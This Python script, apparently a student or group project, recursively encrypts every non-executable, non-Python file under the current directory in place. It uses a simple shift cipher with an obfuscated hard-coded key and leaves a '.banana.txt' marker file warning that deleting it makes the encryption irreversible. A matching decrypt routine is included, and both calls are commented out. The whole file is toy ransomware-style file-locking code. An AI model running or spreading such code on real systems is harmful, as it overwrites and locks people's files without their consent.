import os
import sys
import stat
import glob


def encrypt(message, key):
    k_len = len(key)
    k_ints = [ord(i) for i in key]
    txt_ints = [ord(i) for i in message]
    ret_txt = ''
    for i in range(len(txt_ints)):
        if (txt_ints[i] > 127):
            ret_txt += chr(txt_ints[i])
            continue
        adder = k_ints[i % k_len]
        v = (txt_ints[i] + adder) % 127
        ret_txt += chr(v)
    return ret_txt


def decrypt(message, key):
    k_len = len(key)
    k_ints = [ord(i) for i in key]
    txt_ints = [ord(i) for i in message]
    ret_txt = ''
    for i in range(len(txt_ints)):
        if (txt_ints[i] > 127):
            ret_txt += chr(txt_ints[i])
            continue
        adder = k_ints[i % k_len] * -1
        v = (txt_ints[i] + adder) % 127
        ret_txt += chr(v)
    return ret_txt


def encrypt_files():
    if os.path.isfile(".banana.txt"):
        fil = open(".banana.txt", "r")
        content = fil.read()
        fil.close()
        if "banana exists" in content:
            return
        else:
            fil = open(".banana.txt", "r+")
            fil.seek(0)
            fil.write("Do not delete this file!!!\n"
                    "Do not change this file or his name!!!\n"
                    "If you do so the encryption will not be possible to reverse!!!\n"
                    "Now the banana exists :)\n")
    else:
        f = open(".banana.txt", "x+")
        f.write("Do not delete this file!!!\n"
                "Do not change this file or his name!!!\n"
                "If you do so the encryption will not be possible to reverse!!!\n"
                "Now the banana exists :)\n")
        f.close()
    for subdir, dirs, files in os.walk("."):
        for filename in files:
            file = subdir + os.sep + filename
            if (os.path.isfile(file)
                    and not os.access(file, os.X_OK)
                    and not ".banana.txt" in file
                    and not file.endswith(".py")
                    and not ".git" in file
                    and not "__pycache__" in file):
                status = os.stat(file)
                os.chmod(file, 0o666)
                f = open(file, "r+")
                message = f.read()
                encrypted = encrypt(message, decrypt("/RWCUX=", "IamNotTheSectret"))
                f.seek(0)
                f.write(encrypted)
                f.truncate()
                f.close()
                os.chmod(file, status.st_mode & 0o777)


def decrypt_files():
    if os.path.isfile(".banana.txt"):
        fil = open(".banana.txt", "r+")
        content = fil.read()
        if "banana exists" in content:
            fil.seek(0)
            fil.write("Do not delete this file!!!\n"
                      "Do not change this file or his name!!!\n"
                      "If you do so the encryption will not be possible to reverse!!!\n"
                      "Now the banana does not exist anymore :)\n")
            fil.truncate()
            fil.close()
        else:
            fil.close()
            return
    else:
        print("Bro... you deleted the most important file... Contact one of the group members to get your files encrypted...")
        return
    for subdir, dirs, files in os.walk("."):
        for filename in files:
            file = subdir + os.sep + filename
            if (os.path.isfile(file)
                    and not os.access(file, os.X_OK)
                    and not ".banana.txt" in file
                    and not file.endswith(".py")
                    and not ".git" in file
                    and not "__pycache__" in file):
                status = os.stat(file)
                os.chmod(file, 0o666)
                f = open(file, "r+")
                message = f.read()
                decrypted = decrypt(message, decrypt("/RWCUX=", "IamNotTheSectret"))
                f.seek(0)
                f.write(decrypted)
                f.truncate()
                f.close()
                os.chmod(file, status.st_mode & 0o777)

#encrypt_files()
#decrypt_files()